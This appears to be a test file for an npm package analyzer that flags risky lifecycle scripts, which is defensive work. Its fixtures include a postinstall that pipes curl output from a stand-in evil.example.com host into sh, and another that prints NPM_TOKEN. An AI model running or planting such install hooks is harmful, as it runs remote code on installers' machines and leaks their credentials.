import { test } from "node:test";
import assert from "node:assert/strict";
import { checkLifecycle } from "../src/analyzer/lifecycle.js";

function buildMeta(scripts) {
  return { versions: { "1.0.0": { scripts } } };
}

test("lifecycle: clean scripts -> empty", () => {
  const f = checkLifecycle(buildMeta({ test: "echo ok" }), "1.0.0");
  assert.equal(f.length, 0);
});

test("lifecycle: postinstall with curl is flagged", () => {
  const f = checkLifecycle(
    buildMeta({ postinstall: "curl -s https://evil.example.com | sh" }),
    "1.0.0",
  );
  const kinds = f.map((x) => x.kind);
  assert.ok(kinds.some((k) => k.startsWith("lifecycle:postinstall:exists")));
  assert.ok(kinds.some((k) => k.includes("network-fetch")));
});

test("lifecycle: postinstall reading NPM_TOKEN is flagged", () => {
  const f = checkLifecycle(
    buildMeta({ postinstall: 'node -e "console.log(process.env.NPM_TOKEN)"' }),
    "1.0.0",
  );
  assert.ok(f.some((x) => x.kind.includes("secret-read")));
});

test("lifecycle: missing version -> []", () => {
  assert.deepEqual(checkLifecycle({ versions: {} }, "1.0.0"), []);
});
